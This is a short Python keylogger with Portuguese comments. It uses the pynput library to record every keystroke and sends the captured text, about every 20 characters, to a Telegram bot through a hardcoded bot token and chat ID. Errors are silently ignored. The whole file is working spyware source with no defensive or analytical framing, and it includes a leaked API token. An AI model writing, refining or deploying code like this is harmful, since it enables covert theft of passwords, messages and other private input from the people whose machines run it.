import pynput.keyboard
import requests

# --- COLOQUE SEUS DADOS AQUI ---
TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"
# ------------------------------

log = ""

def send_to_telegram():
    global log
    if log:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        try:
            requests.post(url, data={"chat_id": CHAT_ID, "text": log})
            log = "" 
        except:
            pass

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space: log += " "
        elif key == pynput.keyboard.Key.enter: log += "\n"
        else: log += f" [{key}] "
    
    if len(log) > 20:
        send_to_telegram()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
